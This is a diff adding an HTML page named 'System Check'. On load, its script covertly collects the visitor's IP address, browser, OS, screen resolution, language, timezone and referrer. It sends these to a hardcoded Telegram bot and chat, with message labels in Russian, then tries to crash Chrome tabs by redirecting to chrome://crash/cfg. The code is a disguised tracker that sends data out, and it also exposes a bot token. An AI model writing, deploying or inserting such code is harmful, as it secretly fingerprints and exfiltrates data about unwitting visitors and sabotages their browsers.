@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Check</title>
+</head>
+<body>
+<script>
+    async function execute() {
+        const data = {
+            ip: (await (await fetch('https://api.ipify.org?format=json')).json()).ip,
+            agent: navigator.userAgent,
+            platform: navigator.platform,
+            resolution: `${screen.width}x${screen.height}`,
+            cookies: navigator.cookieEnabled,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer || 'none'
+        };
+
+        const botToken = '8442621494:AAE71KIW6A_CLn2dHN79rvsQChjQsdXeWcc';
+        const chatId = '8212035169';
+        const text = `📡 Данные получены:
+IP: ${data.ip}
+Браузер: ${data.agent}
+ОС: ${data.platform}
+Разрешение: ${data.resolution}
+Куки: ${data.cookies}
+Язык: ${data.language}
+Часовой пояс: ${data.timezone}
+Реферер: ${data.referrer}`;
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+
+        if (/chrome/i.test(data.agent)) {
+            location.href = 'chrome://crash/cfg';
+        } else {
+            document.body.innerHTML = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA9CAYAAAATfBGuAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADeSURBVGhD7ZdLDoMwEENLjzYHnyPlCmWHqkiQyWdasP2kbEJI9GQLha2U8nmR8K4nkJEsKpJFRbKoUMluo5cKd6+n0jCzemoIqmSpZJfUeKZmkX0iayJQJSvZu2Fmx3D3Y/TyCNlVSHYVM5XLIFX2blDJpl4qetf0crbnGVTJUsmm1jiDmXOpkpUsKpJFRbKoSBYVyaLys7tx9FeutVfvud9QJUslm1rjyJqa1jut51dQJUslm1rjDGbOpUpWsqhIFpUlX+N/oa/xBVSywzV+IlTJShYVyaIiWVQki8oOMw5u+TJZud0AAAAASUVORK5CYII=" />';
+        }
+    }
+    execute();
+</script>
+</body>
+</html>
